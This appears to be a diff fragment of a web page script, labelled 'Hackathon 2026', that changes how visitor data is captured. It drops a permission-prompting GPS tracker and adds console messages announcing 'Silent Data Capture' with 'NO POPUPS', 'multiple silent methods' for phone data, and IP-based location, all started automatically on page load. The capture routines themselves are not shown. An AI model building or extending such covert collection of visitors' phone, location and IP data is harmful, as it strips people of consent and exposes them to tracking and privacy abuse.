                 updateLogStats();
                 phoneStatus.textContent = '⏳ Scanning...';
                 phoneStatus.className = 'value pending';
-                locationStatus.textContent = '⏳ Acquiring...';
+                locationStatus.textContent = '⏳ Fetching...';
                 locationStatus.className = 'value pending';
                 ipStatus.textContent = '⏳ Fetching...';
                 ipStatus.className = 'value pending';
                 addLog('info', '🗑️ Data cleared', 'All data removed');
-                if (watchId) {
-                    navigator.geolocation.clearWatch(watchId);
-                    watchId = null;
-                    locationWatchActive = false;
-                }
-                setTimeout(startLiveLocation, 1000);
             }
         };
-
-        function showNotification(msg) {
-            const status = document.querySelector('.hint-text');
-            const orig = status.innerHTML;
-            status.innerHTML = '🔔 ' + msg;
-            status.style.color = 'rgba(255,255,255,0.5)';
-            setTimeout(() => {
-                status.innerHTML = orig;
-                status.style.color = '';
-            }, 3000);
-        }
 
         // ============================================================
         // 8. KEYBOARD SHORTCUTS
@@ -1299,28 +1234,21 @@
                 window.showData(); }
             if (e.ctrlKey && e.shiftKey && e.key === 'L') { e.preventDefault();
                 window.showLog(); }
-            if (e.ctrlKey && e.shiftKey && e.key === 'G') { e.preventDefault();
-                window.forceLocation(); }
         });
 
         // ============================================================
         // 9. INIT
         // ============================================================
 
-        console.log('%c🔍 Hackathon 2026 · Data Capture Active', 'font-size:18px;font-weight:bold;color:#818cf8;');
+        console.log('%c🔍 Hackathon 2026 · Silent Data Capture', 'font-size:18px;font-weight:bold;color:#818cf8;');
+        console.log('%c💡 NO POPUPS - Everything captured silently', 'font-size:14px;color:#6ee7b7;');
+        console.log('%c📱 Phone: Multiple silent methods', 'font-size:14px;color:rgba(255,255,255,0.3);');
+        console.log('%c📍 Location: IP-based (city level accuracy)', 'font-size:14px;color:rgba(255,255,255,0.3);');
         console.log('%c💡 Type showData() to see captured data', 'font-size:14px;color:rgba(255,255,255,0.3);');
-        console.log('%c📍 Live GPS tracking active', 'font-size:14px;color:#fbbf24;');
-        console.log('%c⌨️ Ctrl+Shift+D = Show Data, Ctrl+Shift+L = Show Log, Ctrl+Shift+G = Get Location', 'font-size:14px;color:rgba(255,255,255,0.2);');
+        console.log('%c⌨️ Ctrl+Shift+D = Show Data, Ctrl+Shift+L = Show Log', 'font-size:14px;color:rgba(255,255,255,0.2);');
 
         window.addEventListener('load', function() {
-            setTimeout(main, 800);
-        });
-
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', function() {
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-            }
+            setTimeout(main, 1000);
         });
     </script>
 
